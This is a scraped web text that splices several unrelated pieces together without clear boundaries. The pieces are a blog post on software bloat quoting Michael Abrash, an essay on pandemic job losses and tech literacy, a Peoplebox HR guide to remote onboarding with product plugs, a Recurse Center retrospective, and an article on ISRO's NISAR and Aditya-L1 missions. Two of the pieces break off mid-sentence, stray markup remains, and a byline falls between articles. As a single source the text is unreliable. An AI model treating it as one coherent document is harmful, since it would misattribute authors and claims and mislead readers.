<p>And it’s not just the my text editor and Visual Studio. When <a href="http://www.mozilla.com/thunderbird/">Thunderbird</a> first came out, it was so slow on my fairly average hardware that I simply couldn’t use it. And now on my 2 GHz dual-core whatever-it-is, it’s still slow. I click on Inbox the first time, and it takes a second and a half for the message to pop up. Come on, people — you could load a usenet thread off a floppy drive in that time!</p>

<p>Somehow we’ve convinced ourselves that Gmail’s conversation view and anti-spam features make it worth putting up with 750 millisecond <a href="http://www.codinghorror.com/blog/archives/000722.html">Ajax delays all the time</a>. <i>Nope, it just ain’t right.</i></p>

<p>Recently I was reading from Michael Abrash’s <a href="http://www.byte.com/abrash/"><i>Graphics Programming Black Book</i></a>, and he has something telling (albeit provocative) to say about all this in chapter 2:</p>

<blockquote><p><a href="http://www.byte.com/abrash/" title="Abrash is the Antibloat"><img src="https://blog.brush.co.nz/wp-content/uploads/2017/10/2008_06_abrash.png" width="150" height="133" alt="Abrash's Black Book"></a>You will notice that my short list of objectives for high-performance assembly programming does not include traditional objectives such as easy maintenance and speed of development. Those are indeed important considerations— to persons and companies that develop and distribute software. <b>People who actually <i>buy</i> software, on the other hand, care only about how well that software performs, not how it was developed nor how it is maintained.</b> These days, developers spend so much time focusing on such admittedly important issues as code maintainability and reusability, source code control, choice of development environment, and the like that they often forget rule #1: From the user’s perspective, <i>performance is fundamental.</i></p></blockquote>

<p>My theory is that it’s gonna take an <a href="http://en.wikipedia.org/wiki/Richard_Stallman">RMS</a>-style prophet to come along, take a few pages out of Abrash’s book, write his own instant-GUI operating system, wake up the masses to the 
joy of responsive computing, and watch the bloat industry crumble.</p>

<p>It’ll be a world where you can turn on your computer and use it immediately. A world where you wait at most half a second for big programs to load. A world where your screen will update even before the keyup event is sent. It won’t be utopia, but I’m still looking forward to it.</p>

<p>We’re taking submissions for this kind of prophet. Drop your résumé or CV in the comments below. :-)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-515546384986033abb96"><div><p><strong>What if Everyone Could Code?</strong></p><ul data-rte-list="default"><li><p>What would unemployment look like?</p></li><li><p>What would the pandemic look like?</p></li><li><p>What would the world look like? </p></li></ul><p>There’s no better time to ask this question.</p><p>The world was needlessly unprepared for a pandemic, and now we’re paying the consequences. But the people paying the most are the people who had the least to begin with. Aside from the lives lost, the most troubling component of the pandemic is the economic destruction. 36 million people lost their jobs in two months. Lockdowns eliminated 5 years of job gains in 5 weeks, and now we get a preview of a world that we’ve been steadily heading towards.</p><p>Most Americans aren't well off. We've been told that <a href="https://www.federalreserve.gov/publications/2019-economic-well-being-of-us-households-in-2018-dealing-with-unexpected-expenses.htm" target="_blank">40% can't afford an unexpected expense</a> for a while now. COVID-19 hit the U.S., but it body-slammed Americans.</p><p><a href="https://www.bloomberg.com/news/articles/2020-04-09/missed-rent-payments-cascade-across-the-real-estate-industry" target="_blank">In April, 30% of renters didn't pay rent</a>. But April 2019 – during a strong economy – 18% didn't. The economy was already frail – millions live below simple means. The virus is just exposing what was there all along. </p><p>Americans feel disillusioned about their future. They’re scared they don’t have job security. They feel exploited, helpless, and deserted. In my experience, fear comes from not knowing what to expect and not feeling you have any control over what’s about to happen. Pandemics are frightening, but so is losing hope about your future. COVID-19 reminded us how important technology is, and that makes people scared.</p><p>Tech is challenging to understand, it’s often abstract, and every day we see how much it influence our lives. While tech companies have grown, the average American receded into their large shadows. Americans don't know how these companies work. Even those whose job it is to create new laws and regulation don’t understand. <a href="https://stratechery.com/2018/the-facebook-current/" target="_blank">Painful congressional testimonies</a> further belabor the point: the layperson does not understand the forces governing our world.</p><p>As a society, we used to <em>generally</em> know how technology worked. People understood how cars drove, how planes flew, and how a light bulb glowed. Now, the intangible and complex aspects of tech escape our reach. Technical literacy vanished. Unlike last century, nobody wants to move to the distant future. Many dread it. That makes it hard to take the future seriously.</p><p>The consequences are severe: America is dwindling into a decline. We’ve neglected fixing what’s broken. Other countries, fueled by technological prowess, are opportunistically emerging. The U.S., alternatively, is heading down the wrong path. Contrary to prevailing sentiments prior to the pandemic, most of America was still reeling from the Great Financial crisis. COVID-19 pulled back the curtain.</p><p>We don't need to get back to how things were, we need to extirpate old systems that don't work, and do what humanity does best: build and create. We need to rebuild with modern assumptions based on today's landscape. Based on the Internet. Because the industrial revolution is over, and it’s time for the world’s institutions to move ahead. Those that don’t will and should be left behind. </p><p>Before we rebuild though, we need to understand what isn’t worth saving.</p><p><strong>The Gig is Up</strong><br>As we reflect on the past decade, I believe we’ll realize how inconsequential employment gains really were. Plenty saw a pandemic coming, and just like our health systems, our workforce wasn’t ready. A decade’s worth of job gains evaporated in 2 months.</p><p>One in four U.S. workers are unemployed now. Since the start of lockdowns, <a href="https://www.dataforprogress.org/memos/coronavirus-economic-impact" target="_blank">52% of Americans under 45 have had their hours reduced, been furloughed, or been let go</a>. The pandemic unleashed carnage on the economy, but that’s not surprising. Self-imposed lockdowns should hurt employment rates. But they shouldn’t make 50-year unemployment lows become 80-year unemployment highs. The takeaway: The employment gains following the Great Recession were a mirage. Work transformed, but not for the better.</p><p>Prior to COVID, <a href="https://www.gallup.com/workplace/240929/workplace-leaders-learn-real-gig-economy.aspx" target="_blank">36% of U.S. workers participated in the gig economy</a>. Forty percent of U.S. workers generated <a href="https://www.gao.gov/assets/670/669899.pdf" target="_blank">40% of their income with independent work</a>. This is the first crisis for the gig-economy, and it’s ugly.</p><p>Most gig and hourly workers walk a financial tightrope. These are the Americans from that FED study above. They can’t afford a hit to their earnings. Drivers especially struggle. A <a href="https://www.idgbenefits.org/poll-information" target="_blank">2018 study</a> found that 85% of drivers in New York City struggle to make monthly payments such as rent, utilities, car payments and other bills. And if unable to drive due to car trouble or illness, 70% would run out money within a month.</p><p>Then there are restaurants. More than <a href="https://restaurant.org/research/restaurant-statistics/restaurant-industry-facts-at-a-glance" target="_blank">15.5 million Americans work in restaurants</a>. Of those workers, roughly 3 million live in poverty. Most don’t have paid sick leave. The number of those that are considered middle-class—which pay between $45,000 and $75,000 a year—has grown 84% between 2010 and 2018, a rate <a href="https://restaurant.org/research/restaurant-statistics/restaurant-industry-facts-at-a-glance" target="_blank">three times higher than the overall economy</a>. In April, <a href="https://fred.stlouisfed.org/series/SMU36935617072251101SA" target="_blank">85%</a> of New York City restaurant employees lost their jobs. </p><p>The gig economy collapsed. Ironically, the jobs championed for the autonomous worker made workers more financially vulnerable. Driving for Uber used to have appeal. <em>Be your own boss! </em>It made people feel like they were on the cutting edge, like they were actually riding the tech wave.</p><p>That wave didn’t amount to much though, because everyone tried to ride it. An under-appreciated contributor to ridesharing growth is how many drivers joined. Some were doing it to make some extra cash on the side, but many were turning to it for a full time occupation. Oftentimes because they couldn’t get a job doing something else.</p><p>When a large portion of a country’s workforce becomes unskilled, wages go down. When you’re competing against the rest of the world for these jobs, wages plummet. Globalization punishes commodities and rewards specialization.</p><p>A large reason a majority of the country isn’t doing well financially is because they’re working jobs that no longer matter, and they don’t have the skills to get the jobs that do.</p><p><strong>Workers’ Demise</strong><br>Decades ago U.S. workers had: </p><ol data-rte-list="default"><li><p>Minimal automation to replace them </p></li><li><p>Little competition from low wage countries </p></li><li><p>Sense of belonging to a company </p></li><li><p>Relatively lower medical costs than today </p></li><li><p>Relatively higher wages compared to the executive class than today  </p></li></ol><p>It was a good life. But these assumptions are gone. No wonder they’re in despair. Today, more of them are unhappy, drinking, and dying than <em>three decades ago. </em></p><p>These changes center around jobs.</p><p>In the past decade, the fastest growing companies in the world were American tech companies. This should bode well for the American worker, except, they’re not qualified. It doesn’t help <a href="https://www.digitalexaminer.com/google-consumer-confidence-report/" target="_blank">63% of the U.S. doesn’t know how Google makes money</a>. (That’s a study from 2017!). For the 37% that know Google sells ads, congratulations, you’ve met the first job requirement. And tech companies have done much to reduce job requirements: college degrees aren’t required. The challenge isn’t a willingness to hire, it’s an absence of adequate knowledge. Americans suffer as a result.</p><p>Only <a href="https://www.cyberstates.org/pdf/CompTIA_Cyberstates_2020.pdf" target="_blank">7.8%</a> of the U.S. workforce worked for tech companies in 2019. When you account for the sheer volume of jobs directly supported by tech companies, that percentage seems small. This cohort helps the tech sector account for 10+% of U.S. GDP. They’re rewarded commensurately. Average annual compensation was $111,000 per tech worker in 2017, <a href="https://www.cta.tech/Resources/Newsroom/Media-Releases/2019/April/Tech-Sector-Supports-18-Million-U-S-Jobs,-Represe">82% higher than the overall economy</a>. In 2019, median tech wages were&nbsp;<a href="https://www.cyberstates.org/pdf/CompTIA_Cyberstates_2020.pdf">90%&nbsp;higher than median national wages</a>. Society is not yet ready to deal with the productivity and income disparity between a coder and a 20th century worker.</p><p>Why aren’t we trying harder to get more Americans in these jobs?</p><p>The 2008 financial crisis made big banks bigger. This pandemic is going to make big tech bigger — and <em>fast</em>. Whether its watching Amazon acquire autonomous driving company Zoox, or Apple and Google developing contact tracing protocols, we all see tech growing during COVID. It’d be wise to encourage, maybe even subsidize, our workforce to get involved. As it stands, people know change is coming, yet they feel hopeless about being in a position to capitalize on it.</p><p>Big Tech needs more talent, but they cannot employ all of America. Even so, equipping Americans with the right tools is imperative to this transition. Americans aren’t stupid. The problem is that our education system has an amazing blind spot concerning tech literacy.</p><p>The largest economic crisis in a century is coinciding with an economically imbalanced America. Job security and income inequality have been previously discussed in politics, but now they’re the center of every platform. Finding the right solution should be our chief priority.</p><p>From 1875 to 1920 American steel production grew from <a href="https://en.wikipedia.org/wiki/History_of_the_steel_industry_(1850%E2%80%931970)">380,000 tons to 60 million tons annually</a>, making the U.S. the world leader. We built roads, bridges, and buildings at an incredible pace. But Japan emerged. By 1970, Japan’s steel production reached 93.3 million tons. And it was cheaper.</p><p>In fact, American corporations in general became inefficient and bloated. Foreign companies outperformed U.S. ones. Agile Japanese conglomerates are one such example.</p><p>American workers bore the brunt of the demise. Steel became a commodity, and the winner was the country with the lowest cost. </p><p>We outsourced the raw inputs, in this case, steel. Today, the raw inputs are manufacturing labor in Asian countries. The U.S. doesn’t have a great track record with commoditized inputs.</p><p>A few years ago a colleague observed that the taxi driver was worried about losing their job to the Uber driver, and the Uber driver was worried about self-driving cars. It may be an oversimplification, but it resonated with me. People are anxious about their future, in large part because they feel like they aren’t in control. What can they do if they can’t get a job? Will automation replace them? What will their children do?</p><p>The growing anxiety already manifested politically. We don’t have to look far to see that people are scared, angry, and eager for change. </p><p><strong>A New Religion</strong><br>When we speak of American decline, we usually …</p></div></div></div>

<p><span><span>W</span>hether it’s your first job or twentieth, you will always have fond memories of your day 1 at a new workplace.&nbsp;</span></p>
<p><span>It always feels like a new chapter is about to begin – you meet new people, get yourself acquainted with the new work culture and get ready to start afresh.&nbsp;</span></p>
<p><span>However, all of these activities seem to have taken a backseat as the entire process of hiring and onboarding has now become virtual.</span></p>
<div>
<p><strong>With remote onboarding, the need for human connection and a welcoming experience becomes even more pressing.</strong></p>

</div>
<p><span>As an HR, you’re now responsible for making the onboarding experience of new remote employees as hassle-free and memorable as possible.&nbsp;</span></p>
<p><span>In this article, we set out to explore small details that can make remote onboarding successful and how you can provide a hands-on, personalized experience to new hires.</span></p>



<h3><span><span>1 </span></span><b id="onboarding_process">Start the onboarding process of remote employees way before day 1</b></h3>
<p><span>By the time your new hire logs in on their first day, their paperwork and formalities must be completed. </span><span><br>
</span><span>Aim to make their first day about interaction and minimize the need for calling you or the IT department for getting the things to run.&nbsp;</span></p>
<p><span>All you need to do is start the pre-boarding process at least a week before day 1.&nbsp;</span></p>
<p><span>Here’s a quick checklist of what you can do to kick off your onboarding process well in advance –&nbsp;</span></p>
<ul>
<li><span>Send an email requesting new hires to submit all their necessary documents.&nbsp;</span></li>
<li><span>Introduce them to their reporting managers and encourage them to communicate with them.</span></li>
<li><span>Also, share the details of their work-buddy (we’ll discuss this in detail, later)&nbsp; and help them to reach out to them</span></li>
<li><span>Get their work email and log-in IDs running.</span></li>
</ul>
<p><span><strong><img src="https://www.peoplebox.ai/wp-content/uploads/2020/01/bulb.png" alt="" width="19" height="29" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/01/bulb.png 194w, https://www.peoplebox.ai/wp-content/uploads/2020/01/bulb-13x20.png 13w" sizes="(max-width: 19px) 100vw, 19px">Pro tip</strong>: Use a software like<a href="https://www.peoplebox.ai/one-on-one-meeting-software/"> Peoplebox</a>, that can help you in starting your onboarding process.&nbsp;</span></p>
<p><span>The software can help you map the entire onboarding process with milestones, check-in alerts and task reminders.&nbsp;</span></p>
<p><span>This software also has a variety of templates for the pre-boarding mails which can be customized with your brand theme and message to make the communication more personalized.&nbsp;</span></p>

<h2>Effective One on One Meetings</h2>
<p>We built a software that automatically schedules, lets you set agenda, take notes, exchange feedback and track actions – all in one place.</p>

</div>
</div>
</div>
<h3><span><span>2 </span></span><b id="important_documents">Share all the important documents online</b></h3>
<p><span>Upload your employee handbook and decks related to company culture online.&nbsp;</span></p>
<p><span>You can even go a step further and create videos to welcome remote employees, introduce them to the work norms and help them understand the process better.&nbsp;</span></p>
<p><span>At Dell, the onboarding team has created a digital repository of everything required to make the process easy – documents, videos and instructions.&nbsp;</span></p>
<h3><span><span>3 </span></span><b id="new_joiners">Send the new joiners an agenda for the onboarding week</b></h3>
<p><span>An agenda lays an outline for the expected events and their timeline.</span></p>
<p><span>It will help your new remote employees in preparing themselves before they join in and will also lessen your responsibility of checking-in on them throughout the day.&nbsp;</span></p>
<div>
<p><strong>Let them know about their meetings, who will they be communicating with and what will be the purpose of a particular call.</strong></p>

</div>
<p><span>With an agenda, your new remote employees will know what to expect and you will also have a checklist to prepare for the first day.</span></p>
<h3><span><span>4 </span></span><b id="welcome_kit">Make the welcome kit remote-friendly</b></h3>
<p><span>Usually, every organization provides a “welcome kit’ to their new hires.</span></p>
<p><span>It contains the company’s stationery, t-shirts and other goodies to make new employees feel like a part of the organisation.&nbsp;</span></p>
<p><span>During the onboarding of remote employees, you can get innovative and include items that could also be useful in a work-from-home setup.</span></p>
<p><span>From a comforter cushion, energy-boosting cookies, to a set of good-quality headphones, mouse or even a wifi booster – anything that can make your remote employees’ lives easier.</span></p>

<h3><span><span>5 </span></span><b id="their_workspace">Help your remote employee set their workspace</b></h3>
<p><span>In an on-site onboarding, fixing the work setup is hassle-free as your IT team can easily take care of it. </span></p>
<p><span>With remote employees, this process will involve delivering the laptops and other equipment to different locations.&nbsp;</span></p>
<p><span>That is why you will have to start the coordination process way earlier than usual so that everyone has the necessary equipment before the onboarding starts.&nbsp;</span></p>

<p><strong>Provide them with a checklist mentioning all the supporting equipment (secondary screen, cables and the likes) to perform the tasks related to their job at their home so that they can inform you beforehand. </strong></p>

</div>
<p><span>Similarly, if your organisation requires your employees</span><span>&nbsp;</span><span>to download any particular application, security patch or software upgrade, let them know and help them in the process.&nbsp;</span></p>
<h3><span><span>6</span></span> <b id="Introduce_them">Introduce them to the team</b></h3>
<p><span>Being a part of an organisation means getting a new set of friends, being a part of many inside jokes and enjoying company events together.</span></p>
<p><span>Due to the circumstances, these moments are most likely to be missed by the new employees.&nbsp;</span></p>
<p><span>Thus, you will need to create opportunities for your new hires to gel with their team.&nbsp;</span></p>
<p><span>You can begin by scheduling an introductory call and letting every team member welcome the new hire.</span></p>
<p><span>You must also induct them into the informal communication channels of their department and help them build connections.&nbsp;</span></p>
<p><span><strong><img src="https://www.peoplebox.ai/wp-content/uploads/2020/01/bulb.png" alt="" width="19" height="29" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/01/bulb.png 194w, https://www.peoplebox.ai/wp-content/uploads/2020/01/bulb-13x20.png 13w" sizes="(max-width: 19px) 100vw, 19px">Pro tip</strong>: Begin your introductory team call with </span><a href="https://www.peoplebox.ai/blog/virtual-icebreakers-for-new-remote-hires/"><span>fun icebreaker questions</span></a><span> and </span><a href="https://www.peoplebox.ai/blog/icebreaker-games-for-remote-teams-to-build-better-connect/"><span>fun games</span></a><span> to keep the mood light and friendly.&nbsp;&nbsp;</span></p>

<h4><span><b>Find icebreaker games to build great connect with your remote teams <a href="https://www.peoplebox.ai/blog/icebreaker-games-for-remote-teams-to-build-better-connect/">HERE</a>! </b></span></h4>
</div>
<h3><span><span>7 </span></span><b id="work_buddy">Assign a work buddy</b></h3>
<p><span>Carrying forward from the last point, a work buddy can be of great help in making new hires feel comfortable and learn the ropes of the job.</span></p>
<p><span>The buddy culture has helped many companies establish a strong mentoring culture and has resulted in better intra-departmental coordination.&nbsp;</span></p>
<p><span>What a remote onboarding lacks is human connect and a buddy can provide just that!</span></p>
<div>
<p><strong>Pairing your new remote employees with a buddy will delegate your responsibility of taking care of the new remote employees and they will get hands-on information about the internal working. </strong></p>

</div>
<p><span>In fact, a buddy might even introduce them to more people on a personal level.&nbsp;</span></p>
<p><span>Getting insider information and recommendations from a teammate is much more intimate and comforting.</span></p>
<h3><span><span>8 </span></span><b id="Encourage_cross-functional">Encourage cross-functional communication</b></h3>
<p><span>Remote work has led to the creation of many mental silos amongst team members; especially when it comes to a new employee.</span></p>
<div>
<p><strong>Since they have never worked with the team in person, they only tend to speak to the people they were introduced to by the HR and their leads. </strong></p>

</div>
<p><span>There’s no scope of bumping into a person from another team in the office cafeteria or the bay and communicating with them.&nbsp;</span></p>
<p><span>Thus, it is important to ensure to introduce them to at least one person from each team they may have to coordinate with during the onboarding process.&nbsp;</span></p>
<p><span>This step will open doors for future communication and will help them in carrying out their responsibilities effortlessly.&nbsp;</span></p>
<h3><span><span>9 </span></span><b id="concrete_training">Have a concrete training plan ready</b></h3>
<p><span>The first weeks of every new job are always relaxed and chilled out.</span></p>
<p><span>They tend to become even more so during a WFH setup as the remote employees are with their families and in the comfort of their homes.&nbsp;</span></p>
<p><span>A training plan helps to keep them alert and ensure that the remote employees give their best in understanding the job responsibility and company culture during the onboarding process.</span></p>
<p><span>With a comprehensive training plan, your employees will feel valued and better equipped to carry out their responsibilities.&nbsp;</span></p>
<h3><span><span>10 </span></span><b id="Don’t_forget">Don’t forget your one on one meetings</b></h3>
<p><span>One on one meetings are very important during the onboarding process of remote employees.&nbsp;</span></p>
<p><span>You need to frequently check-in and ask them if the process is going smoothly.&nbsp;</span></p>
<figure id="attachment_6350" aria-describedby="caption-attachment-6350"><img src="https://www.peoplebox.ai/wp-content/uploads/2020/08/virtual-meeting.png" alt="onboarding new remote employees" width="926" height="417" srcset="https://www.peoplebox.ai/wp-content/uploads/2020/08/virtual-meeting.png 926w, https://www.peoplebox.ai/wp-content/uploads/2020/08/virtual-meeting-300x135.png 300w, https://www.peoplebox.ai/wp-content/uploads/2020/08/virtual-meeting-768x346.png 768w" sizes="(max-width: 926px) 100vw, 926px"><figcaption id="caption-attachment-6350">Source – https://airwalkconsulting.com/</figcaption></figure>
<p><span>You must also set up goals and expectations during your one on ones and check on their progress.</span></p>
<p><span>For example – At the end of the first week, what should be accomplished? What should be the learning outcome of the training program?</span></p>
<p><span>You must also take this opportunity to take their feedback and try to work out things they are facing difficulties with.&nbsp;</span></p>
<p><span>During remote work, it is always better to over-communicate when onboarding the new employees.&nbsp;</span></p>
<h3><b>Closing thoughts</b></h3>
<p><span>Onboarding remote employees may seem like a tough nut to crack but the right mindset and detailed preparation can help you go through this process smoothly.&nbsp;</span></p>
<p><span>All you need to do is make communication, planning and video call your best friend – rest will be taken care of. </span></p>

    Posted on August 10, 2020
    
        by Erik Davis
    
</p>



<p>I recently had the opportunity to participate in the Fall 1 2020 batch of the <a href="https://www.recurse.com/">Recurse Center</a>, during the midst of the COVID-19 pandemic. Unfortunately, I only attended for one day. Still, <a href="https://jvns.ca/blog/2014/02/15/how-was-hacker-school/">keeping</a> <a href="https://www.somerandomidiot.com/blog/2015/07/20/retrospective/">with</a> <a href="https://medium.com/@byshiny/my-recurse-center-batch-winter-2-2019-is-the-best-5e9593386ab">the</a> <a href="http://dev.jdherg.com/posts/2015/07/20/the-recurse-center-a-qa-for-past-me/">spirit</a> <a href="https://ljungblad.nu/post/63534520693/new-york-and-recurse-center-prev-hacker-school">of</a> <a href="https://johnloeber.com/w/hackerschool.html">the</a> <a href="https://blog.jabid.in/2017/08/10/rc.html">times</a>, I thought I would write a retrospective. Time to look back on my RC journey!</p>

<p>I had heard of the Recurse Center some years ago, through (I believe) <a href="https://danluu.com/">Dan Luu’s blog</a>. The basic idea is that RC is a “self-directed, community-driven educational retreat for programmers based in New York City”. My mental model for what this looked like is something like this: people from various walks of life come together in a common space to do cool/fun software stuff. Longer term or overarching goals vary somewhat from person to person (e.g. some may want a career change, some want to goof off, some want to learn something very specific), but broadly speaking the participants are there to learn, play, and improve as programmers. As a business, RC operates via supplying recruiters with a pool of talented and motivated job candidates. But for the participants itself it is free, and there is no particular pressure to take a job. Sounds pretty awesome!</p>
<p>Looking back at what I was hoping to get out of RC, the main things were</p>
<ul>
<li>I wanted to get better at software development, and in my experience one of the best ways to do this is through collaboration with others.</li>
<li>I get excited about sharing things I have learned with. I’m rather introverted, but when it comes to topics I am interested in (e.g. math, programming) there is a lot of joy in communication.</li>
<li>I was interested in learning more about alternative institutions for “adult education”. In today’s age, most people have to navigate an uncertain career path, which involves learning new skills, thinking about how to “rebrand” themselves, and so on. I spent some years in academia (including 5 years teaching), so I am fully aware of how that system works and the baggage it carries with it (<strong>cough</strong> lots of time and debt <strong>cough</strong>). Likewise, now that I’ve been in industry for a few years, I have also come to recognize how unseriously “career development” is taken by many employers (though good managers take it upon themselves to look out for their employees in this regard). For these reasons and more, I have felt institutions like the Recurse Center can play an increasingly important role in the future.</li>
</ul>
<p>Thus I thought the Recurse Center had a lot to offer above and beyond an independent sabbatical. But it’s not easy to make it out there to NYC.</p>

<p>I had flirted with the idea of applying to RC for some time, but personal circumstances made committment to it difficult. The first time I considered attending was in 2016, after finishing a math phd. At the time, I did not have the money to support myself living in NYC without a job for 3 months, and so let go of the idea. The second time I considered attending was last year. I was working in the Bay Area as a software engineer and had enough money to pay the bills, but I was also engaged in a long-distance relationship at that time, and was hesitant to uproot myself in a way that would put more physical and emotional distance between myself and my partner (the good news is we’re married and living together now!).</p>
<p>Due to the COVID-19 pandemic, the Recurse Center has shifted to an online-only format, and suddenly my excuses for not attending had evaporated. I applied for a batch and went through the standard interview process: first a quick Zoom call to talk about big picture stuff (personal motivation and so on), followed by a pair programming session (I worked on a toy computer algebra system in Python). And like that, I had been accepted!</p>
<p>I was quite excited to attend. But the last step was also the scariest: I had to quit my job. There’s a nerve wracking element to quitting a job during a pandemic, but I felt that in my current role I had stopped growing in a positive direction and imagined that attending RC would give me some time and space to move things forward. So I did it – I put in my notice at work, and spend the last two weeks trying my best to leave my (former) teammates in a position for success with me gone.</p>

<p>The RC interview process was relatively simple: there had been two Zoom calls scheduled, and the information about these was displayed on the Recurse website immediately upon login. Once I had been accepted, though, things got a bit messier.</p>
<p>It goes without saying that running an online educational retreat differs substantially from an in-person one. In the week leading up to the first day of my batch I received a dozen or so emails covering various operational details, invitations to join Zulip (the chat / discussion software used), to join the GitHub organization, requests to fill out my Recurse profile, links to documents with titles like “Remote RC Orientation Guide”, and so on. It was a lot to take in, and I was wrapping up my last week at work, but I figured that I would get the hang of things once the batch officially started.</p>
<p>I also was assigned an onboarding buddy, who I chatted with the Saturday before my first day. This was quite fun, as we happened to have a number of overlapping interests, so the conversation naturally took care of itself. This experience reinforced in my mind that I had made the right decision to attend: spending a few weeks / months hacking around on software stuff with people like this seemed like a real treat.</p>
<p>The last thing I remember from onboarding was a link to a shared calendar, to which anyone could create a new event. There were already quite a few on there, such as a weely meeting for people trying to learn more mathematics, another weekly meeting for a ML reading group, a daily leetcode practice time, “office hours” held by various RC staffers, some fun stuff, like a streamed cello practice on saturdays, music / book clubs, and many more.</p>
<p>One of my concerns about attending remotely is the time difference between participants. I’m on Pacific time, the Recurse Center itself is on Eastern time, and many of the participants for the remote batches are even further away: some in South America, some in Europe, and so on. But most seemed to be based out of North America, and it was a relief to see the calendar events: although some were at times which I likely wouldn’t attend (e.g. there was an Elm hacking session at 3am my time), most were mid-morning to early afternoon PST.</p>
<p>Pretty cool! I went to bed Sunday night, looking forward to my first day at RC.</p>

<p>My first day started like many of my recent days: I woke up, fed the cat, made some coffee, and then sat down at my computer. There were a few convesations on Zulip. I RSVP’ed for the ML reading group and mentioned I’d be happy to join them at whatever point they were at (this group had started a few weeks earlier, so they had already read 6 chapters of a book). I chatted with someone re: asyncio in Python. We talked about how you can view `async def` as syntactic sugar over ordinary python coroutine stuff, what the event loop is doing, and so on.</p>
<p>I observed, but did not participate in some slightly touchier conversations. One discussion was about a blog post re: Google, “don’t be evil”, and the actual nature of incentives. As you would expect, people feel rather strongly about this, and two camps emerged (one roughly “capitalism bad; eat the rich”, the other “welcome to realpolitik; smash your illusions”) before it was shut down by RC staff. I confess much of my interest in this particular conversation was just in getting a feel for the norms around such a discussion (i.e. to understand expectations around how I conduct myself or discuss controversial topics, and so on – basically, I just want to talk code and math and otherwise don’t want to piss anyone off). The Recurse Center has a formal code of conduct and set of community guidelines, but at any organization there are also many the unwritten rules. In this case, for example, I am not sure whether the discussion actually violated any explicit guideline, but once a RC staffer asked them to stop it, the participants did so.</p>
<p>And so it goes. Anyways, after this, I started scoping out the first project to work on: I wanted to write a toy version of the <a href="http://www.lihaoyi.com/mill/">mill</a> build tool in python to use for another project I had been involved with (basically a big hairy pipeline for astronomical data reduction). I thought through this some, drafted some notes on its design, and ate a late lunch.</p>

<p>There is a common dream which many people experience at some point in their life: they show up to school for the first day of classes, only to realize that they have forgotten to get dressed. I’d never thought about what form this would take for online school. With Zoom, anybody can show up in their underwear, thinking perhaps that the camera is off. But I was dressed!</p>
<p>As far as I can tell, RC used six distinct channels for communicating information to me:</p>
<ol>
<li>direct email, which was the main channel used before I was accepted to the batch</li>
<li>threads on the “Recurse Community” site, which supports something like a message board (but which will also send you emails)</li>
<li>discussions in Zulip (which seemed to be the most active – many conversations every day)</li>
<li>the 1-1 I had with my “onboarding buddy”</li>
<li>the wiki pages, mentioned above</li>
<li>the calendar itself, which is the main way in which events are communicated and coordinated. It’s how I found friends to talk about ML with, for example.</li>
</ol>
<p>There is also a “Virtual RC” space, which is something like a 2D HTML5 canvas MMO where you can move your avatar to various “rooms”. It’s kind of cute; someone was camped outside by a tree.</p>
<p>Bombarded by all of this information, much of which came last week when I was trying to wrap things up at my job, I basically a) added a tag in gmail to at least get all the RC related notifications under one heading, b) made sure to read the “Remote RC Orientation …</p></div></div>

<p>The Indian Space Research Organization’s (ISRO’s) <a href="https://www.isro.gov.in/sites/default/files/flipping_book/annual_report_2019-20_english/files/assets/common/downloads/Annual%20Report%202019-20%20(English).pdf">annual report</a> for 2019-2020 lists a bunch of future space missions that India’s premier, albeit only, space organization plans to undertake. Among other things, there are some unique space science missions that ISRO aims to launch within the next five years.</p>



<h3>Collaboration with NASA on a radar-imaging satellite</h3>



<p>The NASA-ISRO Synthetic Aperture Radar (NISAR) satellite will be the first satellite with a dual-frequency radar imaging system. At <a rel="noreferrer noopener" href="http://syntheticapertureradar.com/nasa-isro-sar-project-nisar/" target="_blank">$1.5 billion</a>, it’s among the most expensive Earth-observation satellites ever built. Following its planned launch onboard a GSLV Mk II rocket in 2021, it will be placed in a Sun-synchronous orbit so that its solar panels can provide constant power.</p>



<div><figure><img loading="lazy" width="1200" height="834" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/01/fdf52-nisar-1.jpg?resize=1200%2C834&amp;ssl=1" alt="" data-recalc-dims="1"><figcaption>An artist’s impression of the&nbsp;NASA-ISRO Synthetic Aperture Radar. <a href="https://www.jpl.nasa.gov/missions/nasa-isro-synthetic-aperture-radar-nisar/">Credit: NASA</a></figcaption></figure></div>



<p>NISAR’s dual-frequency radar imaging system will reveal ongoing changes in Earth’s crust, polar ice, climatic processes, biomass, etc., at a <a rel="noreferrer noopener" href="https://nisar.jpl.nasa.gov/nisarmission/observationstrategy/" target="_blank">high resolution</a> of 3–50 m, at a rapid bi-weekly pace, globally. The satellite will also be used for disaster management, whereby its data will be available only a few hours after observations. ISRO and NASA have said they’ll place all science data from the mission in the public domain.</p>



<h3>India’s first solar observatory</h3>



<p>India’s first space telescope, Astrosat, was designed to observe high-energy cosmic objects in multiple wavelengths. ISRO’s second space telescope will study the Sun with its seven instruments. Launching next year onboard a PSLV-XL rocket, the <a rel="noreferrer noopener" href="https://www.isro.gov.in/aditya-l1-first-indian-mission-to-study-sun" target="_blank">Aditya-L1 mission</a> will observe the Sun’s surface and atmosphere. It will be placed at the first Lagrangian point (L1) between the Sun and Earth, where the dynamic gravitational attraction between these two bodies roughly cancel out.</p>



<div><figure><img loading="lazy" width="1085" height="942" src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/01/b798a-aditya-l1-1.jpg?resize=1085%2C942&amp;ssl=1" alt="" data-recalc-dims="1"><figcaption>A schematic illustration of Aditya-L1 and its instruments. <a href="https://www.isro.gov.in/aditya-l1-first-indian-mission-to-study-sun">Credit: ISRO</a></figcaption></figure></div>



<p>The L1 point is not a point as much as a small region in space, host to multiple solar science missions in the past, such as SOHO, ACE, WIND, DSCOVR, etc. Like those, Aditya-L1 will observe the Sun uninterrupted from this vantage point. The spacecraft’s uniqueness is the ability to observe the Sun in multiple wavelengths while also measuring the solar magnetic field and the solar wind radiation using its in-situ instruments.</p>



<p>In 2018, NASA launched the&nbsp;<a href="https://jatan.space/space-missions/parker-solar-probe/">Parker Solar Probe</a>&nbsp;on a mission to go right into the Sun’s atmosphere to unravel its mysteries! ESA also launched the&nbsp;<a href="https://sci.esa.int/web/solar-orbiter/-/44167-objectives">Solar Orbiter</a>&nbsp;this year on a similar mission except it’ll study the Sun from a bit farther away but still closer in than Mercury. Aditya-L1 will study the Sun from much further away but its global views will allow for its observations to complement data from the NASA and ESA probes.</p>



